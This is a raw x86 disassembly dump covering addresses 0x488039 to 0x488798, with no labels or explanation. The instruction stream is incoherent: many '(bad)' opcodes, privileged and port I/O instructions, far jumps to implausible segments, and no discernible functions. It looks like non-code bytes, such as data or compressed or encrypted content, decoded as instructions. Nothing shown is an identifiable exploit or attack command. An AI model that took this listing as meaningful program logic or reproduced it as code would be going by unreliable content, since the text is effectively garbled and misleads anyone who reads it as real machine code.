  488039:	cmp    BYTE PTR ds:0x56a02b1,dh
  48803f:	scas   eax,DWORD PTR es:[edi]
  488040:	daa    
  488041:	inc    ecx
  488042:	stos   DWORD PTR es:[edi],eax
  488043:	loop   0x4880bb
  488045:	mov    edi,0x5b07465f
  48804a:	cmp    BYTE PTR [eax+edi*4-0x7470ccc9],ch
  488051:	mov    dh,0xbf
  488053:	sbb    DWORD PTR [edx+0xf2a4611],eax
  488059:	inc    ebp
  48805a:	and    dl,dh
  48805c:	lds    ecx,FWORD PTR [edx]
  48805e:	iret   
  48805f:	pop    ds
  488060:	pop    eax
  488061:	aad    0xc5
  488063:	inc    eax
  488064:	(bad)  
  488065:	xor    al,0x27
  488067:	push   eax
  488068:	add    eax,0x31bf6260
  48806d:	aas    
  48806e:	shl    BYTE PTR [ecx+0x5f3730ae],0xf7
  488075:	pusha  
  488076:	push   ecx
  488077:	ins    BYTE PTR es:[edi],dx
  488078:	imul   esp,DWORD PTR [edi+0x1562bf17],0x974e7bc2
  488082:	iret   
  488083:	sbb    DWORD PTR [eax],edi
  488085:	push   ss
  488086:	repnz push edi
  488088:	cmp    BYTE PTR [edi-0x7dbdf2bc],ah
  48808e:	pusha  
  48808f:	pop    es
  488090:	lahf   
  488091:	or     BYTE PTR ds:0xdf0782c2,0x1f
  488098:	daa    
  488099:	mov    cl,0x48
  48809b:	and    ebx,DWORD PTR [edi-0x11]
  48809e:	test   BYTE PTR [ebx],ah
  4880a0:	mov    dh,0x60
  4880a2:	pop    es
  4880a3:	test   DWORD PTR [ebx+0xa],0x8f35121c
  4880aa:	cmp    edi,0x76
  4880ad:	mov    al,0xe2
  4880af:	fisubr WORD PTR [edi]
  4880b1:	idiv   BYTE PTR [edi-0x2d]
  4880b4:	out    dx,eax
  4880b5:	shl    DWORD PTR [eax+0x53],0xb1
  4880b9:	xchg   edi,eax
  4880ba:	xor    al,0x2f
  4880bc:	push   es
  4880bd:	stos   BYTE PTR es:[edi],al
  4880be:	and    DWORD PTR [ecx+ecx*2+0x36],ebx
  4880c2:	ss jg  0x48813c
  4880c5:	or     BYTE PTR [ecx],cl
  4880c7:	xor    DWORD PTR fs:[edi+0x42],ebx
  4880cb:	xchg   BYTE PTR [edx+ebp*4],dh
  4880ce:	sub    eax,0x22b40cf7
  4880d3:	in     al,dx
  4880d4:	pop    ebx
  4880d5:	addr16 inc esi
  4880d7:	mov    BYTE PTR [eax+0x58],cl
  4880da:	and    al,0x3f
  4880dc:	xchg   DWORD PTR [eax],ecx
  4880de:	inc    ebp
  4880df:	shl    ah,cl
  4880e1:	inc    ebp
  4880e2:	xlat   BYTE PTR ds:[ebx]
  4880e3:	sub    dl,bl
  4880e5:	test   al,0x5
  4880e7:	lahf   
  4880e8:	or     edx,DWORD PTR [edi]
  4880ea:	test   DWORD PTR ds:0xb797c024,edx
  4880f0:	inc    edx
  4880f1:	aam    0xd4
  4880f3:	aaa    
  4880f4:	ret    
  4880f5:	xchg   edi,eax
  4880f6:	xor    eax,0x325690a
  4880fb:	mov    BYTE PTR [bx+si],ch
  4880fe:	sbb    al,0xb7
  488100:	xlat   BYTE PTR ds:[ebx]
  488101:	xor    edi,eax
  488103:	sbb    eax,0x1b911f0c
  488108:	xor    al,0x2f
  48810a:	inc    ebx
  48810b:	aam    0xa5
  48810d:	pusha  
  48810e:	jno    0x48818f
  488110:	pop    DWORD PTR [ebx]
  488112:	ss orps xmm6,XMMWORD PTR es:[ebp-0x27bb40e9]
  48811b:	jp     0x4880c8
  48811d:	adc    dl,BYTE PTR [edi+0x14a65adf]
  488123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488124:	pop    ss
  488125:	lahf   
  488126:	adc    edx,DWORD PTR [edi-0x3ce49f5d]
  48812c:	xchg   edi,eax
  48812d:	(bad)  
  48812e:	ja     0x488132
  488130:	loop   0x488194
  488132:	adc    eax,0xb43727d7
  488137:	in     al,0xb6
  488139:	sub    eax,0x37426ff7
  48813e:	jne    0x488168
  488140:	(bad)  
  488141:	cli    
  488142:	outs   dx,DWORD PTR ds:[esi]
  488143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488144:	and    eax,0xc6560207
  488149:	inc    ebx
  48814a:	les    esp,FWORD PTR [ecx]
  48814c:	(bad)  
  48814d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48814e:	scas   eax,DWORD PTR es:[edi]
  48814f:	ja     0x488126
  488151:	add    eax,0x42f74d4c
  488156:	ja     0x4881b8
  488158:	pop    ss
  488159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48815a:	mov    cl,0xe7
  48815c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48815e:	push   esi
  48815f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488160:	xor    eax,0x1558a7c7
  488165:	jbe    0x488114
  488167:	lahf   
  488168:	lahf   
  488169:	scas   eax,DWORD PTR es:[edi]
  48816a:	(bad)
  48816f:	jg     0x4881a0
  488171:	call   0x2ff959de
  488176:	addr16 xor eax,0x26a5e011
  48817c:	push   edi
  48817d:	aaa    
  48817e:	iret   
  48817f:	dec    ebp
  488180:	jp     0x4881ed
  488182:	rol    BYTE PTR [ecx+0x7f],0xf3
  488186:	xchg   DWORD PTR [ebx-0x5a],edi
  488189:	xchg   ecx,eax
  48818a:	arpl   WORD PTR [ebx-0x65],dx
  48818d:	dec    edi
  48818e:	or     al,0x6b
  488190:	pop    ss
  488191:	pop    edx
  488192:	cmp    ecx,DWORD PTR [edi+0x67]
  488195:	push   es
  488196:	sbb    al,0x46
  488198:	xor    dh,BYTE PTR [edx]
  48819a:	out    0x42,eax
  48819c:	xor    DWORD PTR [ebp+0x4d],esi
  48819f:	mov    edi,0x51c8739
  4881a4:	mov    eax,0x8217c3f7
  4881a9:	jg     0x4881ef
  4881ab:	xor    DWORD PTR [edx-0x4918ce52],edx
  4881b1:	xor    BYTE PTR [ecx],dh
  4881b3:	mov    dh,0xe8
  4881b5:	pusha  
  4881b6:	jle    0x4881a3
  4881b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4881b9:	pop    edi
  4881ba:	call   0xe7a0906f
  4881bf:	out    dx,al
  4881c0:	mov    edi,0x5c141d55
  4881c5:	xchg   edx,eax
  4881c6:	pop    es
  4881c7:	xor    bh,ah
  4881c9:	add    DWORD PTR [ebp-0x18ce2fc6],0xffffffc3
  4881d0:	invd   
  4881d2:	cs stos BYTE PTR es:[edi],al
  4881d4:	(bad)  
  4881d5:	xchg   ebx,eax
  4881d6:	div    DWORD PTR [esi]
  4881d8:	outs   dx,DWORD PTR ds:[esi]
  4881d9:	mov    al,ds:0x34b92d34
  4881de:	(bad)  
  4881df:	cmp    DWORD PTR [edx+0x352f0ae0],ecx
  4881e5:	pop    es
  4881e6:	inc    ebx
  4881e7:	dec    eax
  4881e8:	cs in  al,0x22
  4881eb:	inc    ebx
  4881ec:	cmp    cl,al
  4881ee:	lea    eax,[edx-0x42]
  4881f1:	inc    ecx
  4881f2:	add    BYTE PTR [ebx],dh
  4881f4:	add    BYTE PTR [edi],0x91
  4881f7:	pop    esp
  4881f8:	enter  0x4541,0x43
  4881fc:	xor    cl,cl
  4881fe:	ja     0x488263
  488200:	addr16 xor al,0x0
  488203:	inc    esi
  488204:	xor    al,0x94
  488206:	outs   dx,BYTE PTR ds:[esi]
  488207:	add    BYTE PTR [ebx+0x34],al
  48820a:	imul   esp,DWORD PTR [edx],0xffffffdc
  48820d:	bound  esp,QWORD PTR [edx]
  48820f:	aaa    
  488210:	mov    edx,0x5d8e2eaf
  488215:	ror    BYTE PTR [ebx+0x57],0x45
  488219:	retf   0xd45
  48821c:	or     al,BYTE PTR [edi]
  48821e:	(bad)  
  48821f:	mov    bp,0xcd25
  488223:	(bad)  
  488224:	cmp    DWORD PTR [edi],edx
  488226:	mov    edi,0xc2945c8a
  48822b:	inc    edi
  48822c:	xor    al,0xac
  48822e:	push   ebp
  48822f:	add    al,bh
  488231:	fist   WORD PTR [edi-0x79]
  488234:	jo     0x4881d6
  488236:	push   ecx
  488237:	test   ebx,0x3a602abf
  48823d:	jo     0x488272
  48823f:	xchg   DWORD PTR [ebp+0x6f],eax
  488242:	and    eax,0x44018008
  488247:	pop    ss
  488248:	(bad)  
  488249:	jo     0x488206
  48824b:	inc    ebp
  48824c:	stos   DWORD PTR es:[edi],eax
  48824d:	outs   dx,DWORD PTR ds:[esi]
  48824e:	daa    
  48824f:	loope  0x48826b
  488251:	inc    edi
  488252:	pop    ss
  488253:	addr16 (bad) 
  488255:	ja     0x488201
  488257:	rol    BYTE PTR [edi-0x30bcd4a2],cl
  48825d:	out    dx,eax
  48825e:	dec    edx
  48825f:	push   0x15
  488261:	push   0x39
  488263:	scas   eax,DWORD PTR es:[edi]
  488264:	ja     0x48821b
  488266:	shl    DWORD PTR [ebp+0x25],0x87
  48826a:	not    ebx
  48826c:	and    ah,BYTE PTR [edx-0x74]
  48826f:	push   0xffffff87
  488271:	xlat   BYTE PTR ds:[ebx]
  488272:	popf   
  488273:	jnp    0x488210
  488275:	inc    esi
  488276:	iret   
  488277:	div    DWORD PTR [edi]
  488279:	push   edx
  48827a:	and    BYTE PTR [edi],al
  48827c:	sbb    ecx,DWORD PTR [ecx]
  48827e:	jmp    0x4882c6
  488280:	xor    BYTE PTR [eax],cl
  488282:	fild   DWORD PTR [esi]
  488284:	popa   
  488285:	ja     0x4882de
  488287:	sar    DWORD PTR [eax+0x46776626],1
  48828d:	iret   
  48828e:	movups XMMWORD PTR [esi],xmm5
  488291:	je     0x4882f5
  488293:	dec    esi
  488295:	ds cmp ebx,eax
  488298:	lea    esi,[ebp+0x2f176357]
  48829e:	and    eax,0x6fdab018
  4882a3:	xchg   edi,eax
  4882a4:	(bad)  
  4882a6:	mov    al,BYTE PTR [edi]
  4882a8:	aaa    
  4882a9:	pop    ss
  4882aa:	inc    ebp
  4882ab:	pop    DWORD PTR [ebp-0x7f]
  4882ae:	test   DWORD PTR [eax],ecx
  4882b0:	xlat   BYTE PTR es:[ebx]
  4882b2:	xchg   DWORD PTR [edx+0x2a],eax
  4882b5:	je     0x48824a
  4882b7:	xor    ch,BYTE PTR [esi+0x27]
  4882ba:	outs   dx,DWORD PTR ds:[esi]
  4882bb:	lods   al,BYTE PTR ds:[esi]
  4882bc:	dec    eax
  4882bd:	jecxz  0x48831e
  4882bf:	xchg   DWORD PTR [edi+0x11],ebx
  4882c2:	mov    al,0xad
  4882c4:	mov    BYTE PTR [ebp-0x39],0x33
  4882c8:	arpl   WORD PTR ds:0x7c15890,di
  4882ce:	test   DWORD PTR [ebp+edx*2+0x774f0470],0xda558ac6
  4882d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4882da:	aaa    
  4882db:	ja     0x488281
  4882dd:	mov    bh,0x82
  4882df:	or     eax,0x78bb179f
  4882e4:	dec    edx
  4882e5:	nop
  4882e6:	cmp    BYTE PTR [edi],al
  4882e8:	aaa    
  4882e9:	daa    
  4882ea:	pop    esp
  4882eb:	pop    ebx
  4882ec:	shl    DWORD PTR [edx+0x41cf2fc7],cl
  4882f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4882f3:	pop    edx
  4882f4:	sub    ebx,DWORD PTR [eax+0x48835fbf]
  4882fa:	mov    ecx,DWORD PTR ds:0x1b820f63
  488300:	ins    BYTE PTR es:[edi],dx
  488301:	inc    ebp
  488302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488303:	xchg   edi,eax
  488304:	and    ah,BYTE PTR [edi+0x11]
  488307:	lea    edx,[ebp-0x73]
  48830a:	xlat   BYTE PTR ds:[ebx]
  48830b:	pop    es
  48830c:	adc    DWORD PTR [edx-0x3ee8a7e6],eax
  488312:	bound  esp,QWORD PTR [edx+0x31]
  488315:	mov    bh,0xd7
  488317:	dec    edi
  488318:	(bad)  
  488319:	shl    BYTE PTR [esp+ecx*2],1
  48831c:	xor    esi,DWORD PTR [edi+0x3e0b53a5]
  488322:	fistp  WORD PTR [edi+0x2c453aaf]
  488328:	and    dh,BYTE PTR [edi+0x3e1414d7]
  48832e:	mov    cl,0x9f
  488330:	mov    bh,0xa4
  488332:	in     al,0x40
  488334:	sbb    al,dh
  488336:	inc    esi
  488337:	push   edi
  488338:	add    eax,0x77b30305
  48833d:	aaa    
  48833e:	popa   
  48833f:	inc    esp
  488340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488341:	dec    edx
  488342:	addr16 inc esp
  488344:	cmp    bh,BYTE PTR [edx]
  488346:	add    ecx,0xaf38970f
  48834c:	push   ebp
  48834d:	sub    ebx,DWORD PTR [ebp-0x59]
  488350:	out    0xef,eax
  488352:	test   BYTE PTR [edx+0x34c7862e],al
  488358:	andps  xmm7,XMMWORD PTR [edx+0x5e67a955]
  48835f:	aaa    
  488360:	pop    ecx
  488361:	dec    eax
  488362:	and    BYTE PTR [ebx+0x36],al
  488365:	mov    dh,0x56
  488367:	sub    al,0xac
  488369:	pop    ds
  48836a:	out    0x1b,eax
  48836c:	or     esp,DWORD PTR [esp+ebp*2+0x27]
  488370:	push   ebx
  488371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488372:	in     eax,0x5d
  488374:	cmp    al,0xa3
  488376:	jmp    DWORD PTR [esi]
  488378:	xor    DWORD PTR [ebx+0x575843b5],edx
  48837e:	aaa    
  48837f:	inc    edi
  488380:	mov    BYTE PTR [edx+0x2f325700],0x16
  488387:	push   esi
  488388:	fs sub al,0xf
  48838b:	xlat   BYTE PTR ds:[ebx]
  48838c:	and    eax,0x97eb9190
  488391:	xor    dh,BYTE PTR [esi*8+0x12c49d85]
  488398:	(bad)  
  488399:	scas   eax,DWORD PTR es:[edi]
  48839a:	pushf  
  48839b:	pop    eax
  48839c:	fwait
  48839d:	cmp    BYTE PTR [edi+0x38],bl
  4883a0:	daa    
  4883a1:	xchg   DWORD PTR [ecx-0x54],edi
  4883a4:	ret    
  4883a5:	pop    eax
  4883a6:	out    0x9b,eax
  4883a8:	mov    ecx,DWORD PTR [ebp-0x2cd8ea51]
  4883ae:	xor    BYTE PTR [bx+di+0x1883],0x87
  4883b4:	xor    bl,BYTE PTR [edi-0x3ed1d7c9]
  4883ba:	ret    
  4883bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4883bc:	inc    edi
  4883bd:	ss dec edi
  4883bf:	ror    BYTE PTR [edx-0x38484851],0xb7
  4883c6:	or     al,0x2f
  4883c8:	lods   eax,DWORD PTR ds:[esi]
  4883c9:	or     DWORD PTR [edi-0x78b2f002],0x3e
  4883d0:	push   esi
  4883d1:	mov    edi,0x309542a7
  4883d6:	ficom  DWORD PTR [ecx-0x51]
  4883d9:	inc    ebx
  4883da:	outs   dx,DWORD PTR ds:[esi]
  4883db:	(bad)  
  4883dc:	push   es
  4883dd:	adc    ch,0xa9
  4883e0:	iret   
  4883e1:	rdpmc  
  4883e3:	sbb    BYTE PTR [ebx+0x7f1fa312],ah
  4883e9:	mov    ds:0x774d18c9,eax
  4883ee:	fistp  QWORD PTR [ecx+0x46b01c95]
  4883f4:	ja     0x488439
  4883f6:	pop    ebx
  4883f7:	lea    eax,[ebp-0x75]
  4883fa:	add    eax,0x142e7717
  4883ff:	xchg   ecx,eax
  488400:	fdivr  st,st(7)
  488402:	dec    edi
  488403:	inc    edi
  488404:	pusha  
  488405:	xor    esp,DWORD PTR [eax+0x4e538f0d]
  48840b:	lods   eax,DWORD PTR ds:[esi]
  48840c:	jmp    0x6ff:0x27440788
  488413:	push   edx
  488414:	ins    BYTE PTR es:[edi],dx
  488415:	loopne 0x488450
  488417:	ja     0x4883d0
  488419:	adc    esi,eax
  48841b:	push   0x27
  48841d:	arpl   di,cx
  48841f:	adc    eax,0xdf045b62
  488424:	ja     0x4883e5
  488426:	lea    edx,[ecx]
  488428:	mov    ds:0xb88f8762,eax
  48842d:	inc    ebp
  48842e:	mov    bh,0xe3
  488430:	pop    ds
  488431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488432:	inc    edx
  488433:	(bad)  
  488434:	(bad)  
  488435:	pop    edx
  488436:	sub    BYTE PTR [ecx],ah
  488438:	aad    0x8f
  48843a:	fild   WORD PTR [esi-0x4f]
  48843d:	xchg   esi,eax
  48843e:	mov    ah,0x67
  488440:	inc    esi
  488441:	aas    
  488442:	enter  0xcb05,0x5
  488446:	sbb    dh,BYTE PTR [esi]
  488448:	lahf   
  488449:	inc    ebp
  48844a:	ret    0xb822
  48844d:	ins    BYTE PTR es:[edi],dx
  48844e:	ja     0x488466
  488450:	pop    es
  488451:	leave  
  488452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488453:	test   BYTE PTR [ebp+0x47],al
  488456:	jle    0x48849c
  488458:	(bad)  
  48845a:	add    eax,0xb8b70720
  48845f:	ins    DWORD PTR es:[edi],dx
  488460:	mov    ch,0x1b
  488462:	push   edi
  488463:	cs mov bl,0x2a
  488466:	or     BYTE PTR [esi],0xb5
  488469:	adc    BYTE PTR [ebx],ch
  48846b:	fild   WORD PTR [ebx]
  48846d:	sbb    esi,DWORD PTR [esi]
  48846f:	sub    al,0x6f
  488471:	lahf   
  488472:	das    
  488473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488474:	rcr    BYTE PTR [esi],1
  488476:	push   ss
  488477:	ja     0x4884e4
  488479:	aas    
  48847a:	jp     0x4884e8
  48847c:	push   es
  48847d:	push   esi
  48847e:	out    0xab,eax
  488480:	fistp  QWORD PTR [eax]
  488482:	jmp    0xbe8bdb27
  488487:	mov    edi,0x840ac35a
  48848c:	xor    al,0x6f
  48848e:	pop    ss
  48848f:	xchg   BYTE PTR ds:0x1f9f3881,dl
  488495:	scas   eax,DWORD PTR es:[edi]
  488496:	popf   
  488497:	add    BYTE PTR [esi],dl
  488499:	mov    ebx,0xe19f3743
  48849e:	mov    dl,BYTE PTR ds:0x421fa786
  4884a4:	aaa    
  4884a5:	mov    ch,dl
  4884a7:	mov    al,bh
  4884a9:	adc    bh,BYTE PTR [ebx+0x614ec40c]
  4884af:	iret   
  4884b0:	xchg   edi,eax
  4884b1:	adc    eax,0x2f484a83
  4884b6:	jmp    0x8f2c:0x320d3644
  4884bd:	push   bx
  4884bf:	jno    0x48852b
  4884c1:	je     0x4884d0
  4884c3:	retf   0x17e7
  4884c6:	pusha  
  4884c7:	push   ebp
  4884c8:	pop    eax
  4884c9:	mov    ebx,0x89cfa742
  4884ce:	push   ecx
  4884cf:	les    edx,FWORD PTR [ebp-0x19]
  4884d2:	xor    BYTE PTR [ebx+0x6d],cl
  4884d5:	les    esp,FWORD PTR [edx]
  4884d7:	sbb    ebx,DWORD PTR [edi-0x39]
  4884da:	xchg   ebp,eax
  4884db:	push   ss
  4884dc:	ins    BYTE PTR es:[edi],dx
  4884dd:	pop    eax
  4884de:	pop    esi
  4884df:	or     edx,DWORD PTR [edi+0x58b03a4f]
  4884e5:	push   ebx
  4884e6:	xor    ebx,DWORD PTR [ebx+0x4d75385e]
  4884ec:	push   eax
  4884ed:	inc    edx
  4884ee:	xchg   DWORD PTR [edx-0x17],eax
  4884f1:	push   es
  4884f2:	push   es
  4884f3:	xchg   edi,eax
  4884f4:	mov    edi,0xed0c31c6
  4884f9:	add    DWORD PTR [ecx],ecx
  4884fb:	(bad)  
  4884fc:	outs   dx,DWORD PTR ds:[esi]
  4884fd:	inc    ecx
  4884fe:	or     eax,0xf79a2612
  488503:	aaa    
  488504:	(bad)  
  488505:	ficom  DWORD PTR ds:0x6f364d6e
  48850b:	push   edi
  48850c:	pop    ebx
  48850d:	aad    0xd1
  48850f:	jmp    0x135:0x8ee71b3f
  488516:	mov    bh,0xae
  488518:	aas    
  488519:	push   ss
  48851a:	(bad)  
  48851b:	loop   0x4884c3
  48851d:	mov    ds:0xefcfdf2c,eax
  488522:	cmp    edx,edi
  488524:	or     eax,0x1fef22a5
  488529:	xor    bl,BYTE PTR [ebp+0x48]
  48852c:	shl    DWORD PTR [edx+0x85727a7],1
  488532:	mov    edx,DWORD PTR [eax+0x58]
  488535:	xchg   edi,eax
  488536:	rcl    BYTE PTR [edi-0x7530ea92],0xdb
  48853d:	sub    DWORD PTR [ecx+ebx*4+0x3f4637a9],ebp
  488544:	pop    eax
  488545:	jb     0x48854b
  488547:	push   ebx
  488548:	das    
  488549:	inc    esi
  48854a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48854b:	cmp    BYTE PTR [eax-0xb4ae9e],dl
  488551:	mov    tr4,ebx
  488554:	stos   BYTE PTR es:[edi],al
  488555:	push   esi
  488556:	(bad)  
  488557:	xchg   edi,eax
  488558:	aaa    
  488559:	dec    edi
  48855a:	frstor [edx-0x80]
  48855d:	nop
  48855e:	punpckhdq mm0,QWORD PTR ds:0x4f01c520
  488565:	test   al,0xb5
  488567:	pusha  
  488568:	push   eax
  488569:	iret   
  48856a:	pop    es
  48856b:	pop    DWORD PTR [edx]
  48856d:	mov    cl,0x4a
  48856f:	test   BYTE PTR [edi+0xd],bl
  488572:	or     BYTE PTR [eax],ah
  488574:	lods   al,BYTE PTR ds:[esi]
  488575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488576:	call   DWORD PTR [eax]
  488578:	jbe    0x48855a
  48857a:	cmp    DWORD PTR [ebx],edx
  48857c:	aas    
  48857d:	xlat   BYTE PTR ds:[ebx]
  48857e:	push   esp
  48857f:	inc    eax
  488580:	dec    ebp
  488581:	or     eax,0xcdf7307f
  488586:	mov    eax,0x45dfa4a8
  48858b:	pop    ebp
  48858d:	dec    edx
  48858e:	bound  esi,QWORD PTR [edi+ecx*8+0x742323f]
  488595:	push   esi
  488596:	mov    WORD PTR [edi-0x71],ss
  488599:	and    BYTE PTR [esi],dh
  48859b:	pop    edx
  48859c:	call   0x4ebbf4c
  4885a1:	mov    bl,0x80
  4885a3:	sbb    eax,0x2d882773
  4885a8:	pop    eax
  4885a9:	test   bh,dh
  4885ab:	pop    es
  4885ac:	out    0xda,eax
  4885ae:	mov    eax,0x53afdac4
  4885b3:	xchg   eax,ebx
  4885b5:	push   esi
  4885b6:	lods   al,BYTE PTR ds:[esi]
  4885b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4885b8:	fild   QWORD PTR [edi]
  4885ba:	(bad)  
  4885bb:	mov    ch,0xb6
  4885bd:	mov    gs,WORD PTR [ebx-0x21]
  4885c0:	inc    ebx
  4885c1:	aas    
  4885c2:	imul   ecx
  4885c4:	pop    edx
  4885c5:	add    esi,DWORD PTR [eax+0x7f]
  4885c8:	lahf   
  4885c9:	aas    
  4885ca:	mov    BYTE PTR [eax],ah
  4885cc:	mov    WORD PTR [edx-0x31],ss
  4885cf:	pop    es
  4885d0:	lods   eax,DWORD PTR ds:[esi]
  4885d2:	add    eax,0x39df1fab
  4885d7:	mov    dh,0x82
  4885d9:	aad    0x87
  4885db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4885dc:	push   edi
  4885dd:	inc    edx
  4885de:	inc    esp
  4885df:	lods   al,BYTE PTR gs:[esi]
  4885e1:	popa   
  4885e2:	movzx  ecx,WORD PTR [ecx+0x35c956fa]
  4885e9:	imul   eax,DWORD PTR [ecx+0x1],0xffffffe1
  4885ed:	dec    eax
  4885ee:	mov    eax,ds:0x6028a787
  4885f3:	leave  
  4885f4:	push   ebp
  4885f5:	xchg   DWORD PTR [ecx+0x2a],eax
  4885f8:	test   DWORD PTR [ebp+0x7fe7e7d0],0x748825ff
  488602:	(bad)  
  488603:	das    
  488604:	aaa    
  488605:	push   DWORD PTR [ebx]
  488607:	(bad)  
  488608:	mov    ch,0xd0
  48860a:	sub    cl,BYTE PTR es:[edi+0x64a44c17]
  488611:	in     al,0x38
  488613:	inc    ebx
  488614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488615:	sbb    BYTE PTR [edi],cl
  488617:	cmc    
  488618:	out    0xcf,eax
  48861a:	inc    ebx
  48861b:	test   DWORD PTR [eax],0x175485f5
  488621:	(bad)  
  488622:	(bad)  
  488623:	popa   
  488624:	shr    ch,cl
  488626:	imul   ebx,DWORD PTR [edi],0x34
  488629:	push   ss
  48862a:	rcr    BYTE PTR [edx-0x60e853dc],1
  488630:	xor    esp,DWORD PTR [esi]
  488632:	out    dx,eax
  488633:	mov    DWORD PTR [edi+0x6ee3431e],edx
  488639:	iret   
  48863a:	sub    eax,0x5b313fdd
  48863f:	aas    
  488640:	pop    ds
  488641:	xor    DWORD PTR [ebx],eax
  488643:	jno    0x48861c
  488645:	dec    ebp
  488646:	push   edx
  488647:	(bad)  
  488648:	ss aas 
  48864a:	ret    0x15d5
  48864d:	inc    edx
  48864e:	aas    
  48864f:	or     DWORD PTR [ebp+0x30],0x18
  488653:	push   edi
  488654:	das    
  488655:	(bad)  
  488656:	sbb    DWORD PTR ss:[ecx+0x320ae718],edi
  48865d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48865e:	ss inc esi
  488660:	or     ebp,DWORD PTR [esi-0x48]
  488663:	ss daa 
  488665:	cmp    DWORD PTR [edi],ebp
  488667:	xor    DWORD PTR [edi-0x6c6cfe53],edi
  48866d:	xor    dh,BYTE PTR [ebx]
  48866f:	dec    edi
  488670:	es mov eax,0x1f170545
  488676:	xchg   DWORD PTR [edi],ebp
  488678:	add    DWORD PTR [ebx+0x637eafd0],ebp
  48867e:	(bad)
  488681:	xor    esp,DWORD PTR [edi]
  488683:	pusha  
  488684:	das    
  488685:	mov    cl,0x54
  488687:	(bad)  
  488688:	aaa    
  488689:	mov    bh,0x37
  48868b:	stos   BYTE PTR es:[edi],al
  48868c:	adc    BYTE PTR [ecx+eiz*8+0x38],0x9f
  488691:	outs   dx,DWORD PTR ds:[esi]
  488692:	add    esi,eax
  488694:	loop   0x48865c
  488696:	aas    
  488697:	sub    al,0xd6
  488699:	je     0x48864b
  48869b:	(bad)  
  48869c:	(bad)  
  48869e:	out    dx,al
  48869f:	cs shl BYTE PTR cs:0xb0a3b61f,1
  4886a7:	loopne 0x488693
  4886a9:	adc    bl,BYTE PTR [edi]
  4886ab:	inc    esi
  4886ac:	xchg   edi,eax
  4886ad:	xor    eax,0x1ff05801
  4886b2:	and    eax,DWORD PTR [edi-0x2f]
  4886b5:	jmp    0x52ff:0x9fcf8ac6
  4886bc:	and    DWORD PTR [edi+0x763346c0],ecx
  4886c2:	add    bl,ch
  4886c4:	add    al,0x37
  4886c6:	out    0x71,eax
  4886c8:	add    BYTE PTR [ebx-0x22a828fa],ch
  4886ce:	adc    al,0xce
  4886d0:	arpl   WORD PTR [edi-0x3a],bp
  4886d3:	pop    es
  4886d4:	adc    BYTE PTR [eax-0x50],dh
  4886d7:	cmp    BYTE PTR [edi+0x402ed033],0x69
  4886de:	iret   
  4886df:	imul   esp,DWORD PTR [ecx+edx*2+0x372f9d82],0xe
  4886e7:	inc    edi
  4886e8:	stos   DWORD PTR es:[edi],eax
  4886e9:	dec    eax
  4886ea:	add    eax,0x561fb70f
  4886ef:	xor    DWORD PTR [esi+0xa],ebp
  4886f2:	scas   eax,DWORD PTR es:[edi]
  4886f3:	xlat   BYTE PTR ds:[ebx]
  4886f4:	sbb    DWORD PTR [edx+0x58],edi
  4886f7:	and    eax,0x79023797
  4886fc:	es mov al,0xd7
  4886ff:	sahf   
  488700:	xor    esp,DWORD PTR [eax+0x3461ac0b]
  488706:	addr16 pop edi
  488708:	add    bh,BYTE PTR [esi]
  48870a:	popa   
  48870b:	and    DWORD PTR [edi],0xffffffa7
  48870e:	inc    esi
  48870f:	sub    BYTE PTR [esi-0x48e06aa8],ch
  488715:	xor    al,BYTE PTR [edi-0x50]
  488718:	inc    edx
  488719:	add    DWORD PTR [edi+0x781ddf0a],esi
  48871f:	jmp    0x488731
  488721:	call   FWORD PTR [ebx+0x7c5aac77]
  488727:	popa   
  488728:	mul    DWORD PTR [edx]
  48872a:	pop    ds
  48872b:	lock push eax
  48872d:	stos   DWORD PTR es:[edi],eax
  48872e:	push   0x4136f7cf
  488733:	push   edi
  488734:	sub    dl,BYTE PTR [edi]
  488736:	pop    ss
  488737:	(bad)  
  488738:	xor    ecx,DWORD PTR [eax]
  48873a:	or     eax,0x9f5762c2
  48873f:	shl    BYTE PTR [edi-0x74d0778a],0xb4
  488746:	cdq    
  488747:	shl    BYTE PTR [eax+0x5060b357],1
  48874d:	sbb    al,0x1
  48874f:	cmp    eax,DWORD PTR [ebx-0x21]
  488752:	sub    al,0x58
  488754:	dec    esp
  488755:	xchg   edi,eax
  488756:	daa    
  488757:	mov    esi,0xe0663ff7
  48875c:	jbe    0x488772
  48875e:	outs   dx,DWORD PTR ds:[esi]
  48875f:	xor    al,0x8f
  488761:	cmp    edi,esi
  488763:	mov    BYTE PTR [eax-0x3e],bl
  488766:	and    eax,0x3ac4efa6
  48876b:	adc    BYTE PTR [edx+0x3f],bl
  48876e:	iret   
  48876f:	mov    ecx,0x9f10e80e
  488774:	pop    edi
  488775:	inc    edx
  488776:	jp     0x4887d7
  488778:	pop    eax
  488779:	ins    BYTE PTR es:[edi],dx
  48877a:	dec    edi
  48877b:	jae    0x4887cc
  48877d:	pop    ebp
  48877e:	dec    ebx
  48877f:	stos   DWORD PTR es:[edi],eax
  488780:	cwde   
  488781:	(bad)  
  488782:	imul   esi,DWORD PTR [ecx+0x1f2cd608],0x7
  488789:	or     eax,0x3ff58029
  48878e:	adc    ecx,DWORD PTR [edi-0x71f25300]
  488794:	inc    edi
  488795:	fistp  WORD PTR [eax+0x2a]
  488798:	xchg   edx,eax
